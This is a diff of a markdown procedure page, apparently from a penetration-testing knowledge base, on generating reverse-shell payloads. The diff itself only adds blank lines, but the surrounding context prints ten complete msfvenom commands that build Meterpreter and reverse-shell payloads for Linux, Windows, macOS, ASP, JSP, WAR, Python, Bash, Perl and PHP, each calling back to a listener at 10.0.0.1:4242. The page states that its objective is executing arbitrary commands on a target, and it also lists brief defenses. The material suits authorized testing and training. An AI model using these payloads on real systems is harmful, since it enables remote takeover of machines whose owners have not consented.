@@ -46,11 +46,15 @@ The technical explanation of this procedure is that it generates a payload that 
 
 The business value of this procedure is that it allows organizations to identify vulnerabilities in their security measures and take appropriate measures to protect their systems from attackers.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
 
 1. Knowledge of the target system's platform
+
+ 
 
 ## Defense
 
@@ -60,6 +64,8 @@ The business value of this procedure is that it allows organizations to identify
 
 1. Monitor network traffic for suspicious activity and anomalies
 
+ 
+
 ## Objectives
 
 1. Generate a reverse shell payload for various platforms
@@ -68,13 +74,23 @@ The business value of this procedure is that it allows organizations to identify
 
 1. Execute arbitrary commands on the target system
 
+ 
+
 # Instructions
 
 1. Use the msfvenom tool to generate multiple payloads for different platforms using different formats.
 
+ 
+
+
+
 **Code**: [[$ msfvenom -p linux/x86/meterpreter/reverse_tcp LH]]
 
+
+
 > The msfvenom tool is used to generate payloads for various platforms. This command generates payloads for Linux, Windows, OSX, Java, and PHP. The payloads are generated with different formats such as ELF, EXE, Mach-O, ASP, JSP, WAR, Python, Bash, Perl, and PHP. The LHOST and LPORT arguments are used to specify the IP address and port number of the listener. The generated payload is saved in a file with the specified format. The last command copies the PHP payload to the clipboard, creates a new PHP file, and pastes the copied content to the new file. This command can be used to generate payloads for different platforms and formats for testing and exploitation purposes.
+
+
 
 **Command** ([[Generate Linux Meterpreter Payload]]):
 
@@ -82,11 +98,19 @@ The business value of this procedure is that it allows organizations to identify
 $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
 ```
 
+
+
+
+
 **Command** ([[Generate Windows Meterpreter Payload]]):
 
 ```bash
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
 ```
+
+
+
+
 
 **Command** ([[Generate OSX Reverse Shell Payload]]):
 
@@ -94,11 +118,19 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe
 $ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
 ```
 
+
+
+
+
 **Command** ([[Generate ASP Meterpreter Payload]]):
 
 ```bash
 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
 ```
+
+
+
+
 
 **Command** ([[Generate Java JSP Reverse Shell Payload]]):
 
@@ -106,11 +138,19 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
 ```
 
+
+
+
+
 **Command** ([[Generate Java WAR Reverse Shell Payload]]):
 
 ```bash
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
 ```
+
+
+
+
 
 **Command** ([[Generate Python Reverse Shell Payload]]):
 
@@ -118,11 +158,19 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > sh
 $ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
 ```
 
+
+
+
+
 **Command** ([[Generate Bash Reverse Shell Payload]]):
 
 ```bash
 $ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
 ```
+
+
+
+
 
 **Command** ([[Generate Perl Reverse Shell Payload]]):
 
@@ -130,11 +178,17 @@ $ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.s
 $ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
 ```
 
+
+
+
+
 **Command** ([[Generate PHP Meterpreter Payload]]):
 
 ```bash
 $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -167,3 +221,5 @@ $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > s
 - [[Meterpreter Shell]]
 - [[Other platforms]]
 - [[Reverse Shell Cheat Sheet]]
+
+
